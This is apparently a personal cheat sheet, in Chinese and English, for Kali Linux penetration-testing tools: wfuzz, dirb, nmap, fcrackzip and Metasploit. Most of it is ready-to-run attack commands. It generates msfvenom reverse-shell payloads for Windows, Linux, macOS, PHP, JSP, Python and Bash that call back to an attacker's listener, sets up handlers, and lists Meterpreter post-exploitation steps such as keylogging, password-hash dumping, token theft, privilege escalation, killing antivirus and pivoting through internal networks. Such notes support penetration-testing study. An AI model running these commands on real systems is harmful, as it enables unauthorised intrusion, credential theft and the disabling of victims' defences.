# kali工具

## wfuzz

`wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something`

`COMMAND ==>  wfuzz -c -w /usr/share/seclists//usr/share/seclists/Discovery/DNS --hc 404 --hw 617 -u website.com -H "HOST: FUZZ.website.com"`

`COMMAND  ==> wfuzz -c -w /usr/share/seclists//usr/share/seclists/Discovery/DNS --hc 404 --hw 7873 -u hnpsec.com -H "HOST: FUZZ.hnpsec.com"`

()WORKING WITH FILTERS:                                                                               |   

(i) If we want to filter words then we used switch --hw (words_lenth. In above example --hw 12)        |
(ii) To filter lenth then we used --hl(In above above example this would be --hl 7)
(iii) For chars we used --hh (In above example this would br --hh 206)                                 |
(iv) For response code we use --hc. And always we attach --hc 404. Because this is common for all

## dirb

`dirb url -x .php`

`dirb url -x /contents.txt`



## metasploit

在kali 2.0中启动带数据库支持的MSF方式如下：
#1 首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；
#2 初始化MSF数据库（关键步骤！）：msfdb init；
#3 运行msfconsole：msfconsole；
#4 在msf中查看数据库连接状态：db_status。

### msfconsole

#### search

使用search命令搜索模块

`search xx`

`search type:exploit platform:linux`

#### show

show options

### module

#### jtr_linux

#### xxxx_version

查看某服务版本

#### \*portscan\*

端口扫描

#### scanner/smb

系统信息扫描

### msfvenom

```shell
主要参数：
-p payload
-e 编码方式
-i 编码次数
-b 在生成的程序中避免出现的值
LHOST,LPORT 监听上线的主机IP和端口
-f exe 生成EXE格式
使用msfvenom -l 可以查看可以利用payload
msfvenom -l | grep windows | grep x64 | grep tcp  选择payload
```

#### 生成可执行文件

```shell
Linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
Windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
Mac:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
JSP:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
WAR:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
Python:
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
Bash:
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
Perl:
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

#### 监听

```csharp
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false   让connection保持连接(即使一个连接退出,仍然保持listening状态)
exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--也即是自动后台运行)
```

```bash
msf exploit(handler) > set LHOST 172.16.0.4
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j -z  
-j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)
msf exploit(handler) > jobs  查看后台攻击任务 
msf exploit(handler) > kill <id>  停止某后台攻击任务 
msf exploit(handler) > sessions -l  (查看会话)
```

```undefined
msf exploit(handler) > sessions -i 2   选择会话
msf exploit(handler) > sessions -k 2   结束会话
```

```undefined
Ctrl+z  把会话放到后台
Ctrl+c  结束会话
```

### Meterpreter后攻击

#### 常用命令

```bash
meterpreter > background  放回后台
meterpreter > exit  关闭会话
meterpreter > help  帮助信息
meterpreter > Sysinfo系统平台信息
meterpreter > screenshot  屏幕截取
meterpreter > shell  命令行shell (exit退出)
meterpreter > getlwd  查看本地目录
meterpreter > lcd  切换本地目录
meterpreter > getwd  查看目录
meterpreter > ls 查看文件目录列表
meterpreter > cd  切换目录 
meterpreter > rm  删除文件 
meterpreter > download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件
meterpreter > upload /var/www/wce.exe wce.exe  上传文件
meterpreter > search -d c:  -f *.doc  搜索文件
meterpreter > execute -f  cmd.exe -i   执行程序/命令 
meterpreter > ps  查看进程
meterpreter > run post/windows/capture/keylog_recorder   键盘记录
meterpreter > getuid  查看当前用户权限
meterpreter > use priv  加载特权模块
meterpreter > getsystem  提升到SYSTEM权限
meterpreter > hashdump  导出密码散列
meterpreter > ps   查看高权限用户PID
meterpreter > steal_token <PID>  窃取令牌
meterpreter > rev2self  恢复原来的令牌 
meterpreter > migrate pid  迁移进程
meterpreter > run killav  关闭杀毒软件 
meterpreter > run getgui-e  启用远程桌面
meterpreter > portfwd add -l 1234 -p 3389 -r <目标IP>  端口转发
meterpreter > run get_local_subnets  获取内网网段信息
meterpreter > run autoroute -s <内网网段>  创建自动路由
meterpreter > run autoroute -p  查看自动路由表
创建代理通道:
msf > use auxiliary/server/socks4a   设置socks4代理模块
msf auxiliary(socks4a) > show options 
msf auxiliary(socks4a) > run
配置proxychains参数：
nano /etc/proxychains.conf   修改代理监听端口,和前面端口一致
quite_mode  设置成安静模式：去掉如下参数前面的注释
```

### 插件

#### wmap

添加网址:`wmap_sites -a`

添加目标:`wmap_targets -t` 

加载模块:`wmap_run -t`

开始扫描:`wmap_run -e`

查看结果:`wmap_vulns -l`

## nmap

•ICMP扫描：nmap  -sP 192.168.1.100-254

•尝试检测目标操作系统：-O

•SYN扫描：-sS

•操作系统版本检测：-sV

•AWD常用命令

​	nmap –sS –p 1337 172.16.0.0/24

-sP ：进行ping扫描

打印出对ping扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)： 

下面去扫描10.0.3.0/24这个网段的的主机

-sn:  Ping Scan - disable port scan  #ping探测扫描主机， 不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）

-sA

nmap 10.0.1.161 -sA （发送tcp的ack包进行探测，可以探测主机是否存活）



## fcrackzip

```shell
fcrackzip -b -c 'aA1!' -l 1-10 -u crack_this.zip 
```

```
fcrackzip -b -c '1' -l 1-10 -u crack_this.zip 
```